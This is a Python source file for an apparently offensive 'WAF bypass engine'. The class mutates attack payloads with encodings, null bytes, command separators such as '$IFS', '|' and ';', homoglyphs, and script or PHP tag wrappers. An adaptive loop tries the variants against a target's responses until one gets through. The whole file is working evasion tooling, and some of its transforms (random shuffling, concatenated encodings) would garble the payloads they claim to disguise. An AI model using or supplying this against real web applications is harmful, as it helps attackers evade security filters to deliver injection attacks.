import base64
import urllib.parse
import random
import string
import hashlib
import itertools
import binascii
import math
import re
from typing import List, Callable, Dict, Set, Any

class WAFBypassEngine:
    def __init__(self):
        self.alphabet = string.ascii_letters + string.digits
        self.magic_bytes = [
            '%00', '%0a', '%0d', '%09', '%20', '%2e', '%2f', '%3b', '%23', '%5c', '%27',
            '%22', '\\u0000', '\u200b', '-->', '<!--', '|', '||', ';', '^', '$IFS', '%7c'
        ]
        self.sep_chars = ['/', '\\', '%2f', '%5c', '//', '%2e%2e%2f']
        self.base_encodings = [self._base64, self._base32, self._hex, self._bin]
        self.text_representations = [
            self._rot13, self._alt_case, self._reverse, self._random_padding,
            self._shuffle, self._unicode_homoglyphs, self._split_by_magic, self._inline_comments
        ]
        self.waf_bypass_ops = [
            self._xor, self._base64, self._double_url_encode, self._url_encode_random, self._insert_null, self._delimiter_break, 
            self._interleaved_magic, self._prefix_obfuscation, self._fragmentation, self._semicolon_trick,
            self._chunk_and_obfuscate, self._obfuscate_words, self._unicode_shuffle, self._encode_chained, self._wrap_obfuscate
        ]
        self.max_depth = 3
        self.max_combinations = 3000

    def bypass_candidates(self, payload: str) -> List[str]:
        candidates = set()
        for op in self.waf_bypass_ops:
            candidates.add(op(payload))
        for enc in self.base_encodings:
            candidates.add(enc(payload))
        for text_op in self.text_representations:
            candidates.add(text_op(payload))
        for mb in self.magic_bytes + self.sep_chars:
            candidates.add(payload + mb)
            candidates.add(mb + payload)
        candidates.add(payload)
        perms = [self.waf_bypass_ops, self.base_encodings, self.text_representations]
        # Combinatorial chaining (bounded)
        all_ops = self.waf_bypass_ops + self.text_representations + self.base_encodings
        chained = list(itertools.product(all_ops, repeat=2)) + list(itertools.product(all_ops, repeat=3))
        random.shuffle(chained)
        count = 0
        for combo in chained:
            p = payload
            for func in combo:
                try:
                    p = func(p)
                except Exception:
                    break
            candidates.add(p)
            count += 1
            if count > self.max_combinations:
                break
        # Unique
        return list({c for c in candidates if c and isinstance(c, str)})

    def adaptive_bypass_exploit(self, payload: str, response_func: Callable[[str], Any], success_detector: Callable[[Any], bool], max_trials: int = 500) -> str:
        tried: Set[str] = set()
        for p in self.bypass_candidates(payload):
            if p not in tried:
                resp = response_func(p)
                if success_detector(resp):
                    return p
                tried.add(p)
            if len(tried) >= max_trials:
                break
        return None

    def _xor(self, s: str) -> str:
        key = random.randint(1, 255)
        res = ''.join(chr(ord(x) ^ key) for x in s)
        return binascii.hexlify(res.encode()).decode()

    def _rot13(self, s: str) -> str:
        return s.translate(str.maketrans(
            "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz", 
            "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm"))

    def _reverse(self, s: str) -> str:
        return s[::-1]

    def _alt_case(self, s: str) -> str:
        return ''.join(c.lower() if i % 2 else c.upper() for i, c in enumerate(s))

    def _shuffle(self, s: str) -> str:
        l = list(s)
        random.shuffle(l)
        return ''.join(l)

    def _base64(self, s: str) -> str:
        return base64.b64encode(s.encode()).decode()

    def _base32(self, s: str) -> str:
        return base64.b32encode(s.encode()).decode()

    def _bin(self, s: str) -> str:
        return ' '.join(format(ord(x),'08b') for x in s)

    def _hex(self, s: str) -> str:
        return binascii.hexlify(s.encode()).decode()

    def _double_url_encode(self, s: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(s))

    def _url_encode_random(self, s: str) -> str:
        p = ''.join(
            c if random.random()<0.60 else urllib.parse.quote_plus(c)
            for c in s
        )
        return p

    def _insert_null(self, s: str) -> str:
        idx = random.randint(0, len(s))
        return s[:idx] + '%00' + s[idx:]

    def _delimiter_break(self, s: str) -> str:
        idx = random.randint(1, len(s)-1) if len(s)>2 else 1
        return s[:idx] + random.choice([';', '|', '$IFS', '%0a', '%0d']) + s[idx:]

    def _interleaved_magic(self, s: str) -> str:
        mid = len(s) // 2
        pat = random.choice(self.magic_bytes)
        return s[:mid] + pat + s[mid:]

    def _prefix_obfuscation(self, s: str) -> str:
        return random.choice(self.magic_bytes+self.sep_chars) + s

    def _fragmentation(self, s: str) -> str:
        frag = list(s)
        random.shuffle(frag)
        return ''.join(frag[:len(frag)//2]) + '%' + ''.join(frag[len(frag)//2:])

    def _semicolon_trick(self, s: str) -> str:
        return s + ';' + s

    def _random_padding(self, s: str) -> str:
        pad = ''.join(random.choices(self.alphabet, k=5))
        return pad + s + pad[::-1]

    def _chunk_and_obfuscate(self, s: str) -> str:
        c = [s[i:i+2] for i in range(0, len(s), 2)]
        return '%0a'.join(c)

    def _split_by_magic(self, s: str) -> str:
        idx = len(s)//2
        magic = random.choice(self.magic_bytes)
        return s[:idx]+magic+s[idx:]

    def _inline_comments(self, s: str) -> str:
        parts = s.split(' ')
        return '/**/'.join(parts)

    def _obfuscate_words(self, s: str) -> str:
        chunks = s.split(' ')
        return ' '.join(
            ''.join(
                c if random.random()<0.5 else urllib.parse.quote(c)
                for c in word
            ) for word in chunks
        )

    def _unicode_homoglyphs(self, s: str) -> str:
        table = {'a': '\u0430', 'c': '\u0441', 'e': '\u0435', 'i': '\u0456', 'o': '\u043e', 'p': '\u0440', 'x': '\u0445'}
        return ''.join(table.get(c, c) for c in s)

    def _encode_chained(self, s: str) -> str:
        out = s
        for _ in range(random.randint(2,4)):
            out = random.choice([self._base64, self._hex, self._url_encode_random, self._reverse])(out)
        return out

    def _wrap_obfuscate(self, s: str) -> str:
        wrap = random.choice(["<script>", "<![CDATA[", "#!", "<?php", "\'", "\""])
        return f"{wrap}{s}{wrap[::-1]}"

    def _polymorphic(self, s: str) -> str:
        return ''.join(
            random.choice([c, urllib.parse.quote_plus(c), c.upper(), c.lower(), '%{:02x}'.format(ord(c))])
            for c in s
        )

    def brute_force_charset(self, s: str, min_mutate=1, max_mutate=3) -> Set[str]:
        chars = [s]
        for n in range(min_mutate, max_mutate+1):
            for idxs in itertools.combinations(range(len(s)), n):
                arr = list(s)
                for idx in idxs:
                    arr[idx] = urllib.parse.quote_plus(arr[idx])
                chars.append(''.join(arr))
        return set(chars)
    
    def magic_hinting(self, payload: str, hints: List[str]) -> List[str]:
        variants = []
        for hint in hints:
            variants.append(hint + payload)
            variants.append(payload + hint)
        return variants

    def waf_ml_smart_mutate(self, payload: str, response_history: List[Dict]) -> List[str]:
        new_variants = []
        for history in response_history:
            if "challenge" in history.get('response','').lower(): 
                pad = ''.join(random.choices(self.alphabet, k=8))
                new_variants.append(pad + payload + pad)
            if "blocked" in history.get('response','').lower():
                mid = len(payload)//2
                new_variants.append(payload[:mid] + '%23' + payload[mid:])
        for _ in range(4):
            new_variants.append(self._polymorphic(payload))
        return new_variants

    def attack_graph_mutation(self, payload: str, context_variant: str) -> List[str]:
        variants = []
        if context_variant == 'header':
            variants.append(f"X-Real-Data: {payload}")
            variants.append(f"Set-Cookie: data={payload}")
        elif context_variant == 'cookie':
            variants.append(f"session={payload}")
        elif context_variant == 'url_path':
            variants.append(f"/{payload}/../")
        for sep in self.sep_chars:
            variants.append(sep.join([payload[:len(payload)//2], payload[len(payload)//2:]]))
        return variants

    def knowledge_inspired_generation(self, payload: str) -> List[str]:
        inspired = []
        if "script" not in payload:
            inspired.append(f"<script>{payload}</script>")
        if payload.isalnum():
            inspired.append(''.join(['&#{};'.format(ord(x)) for x in payload]))
        inspired.append(self._reverse(payload))
        inspired.append(self._rot13(payload))
        return inspired

    def quantum_superposition(self, payload: str) -> Set[str]:
        parts = [self._base64(payload), self._rot13(payload), self._reverse(payload), self._hex(payload)]
        result = set()
        for n in range(1, len(parts)+1):
            for comb in itertools.combinations(parts, n):
                result.add(''.join(comb))
        return result
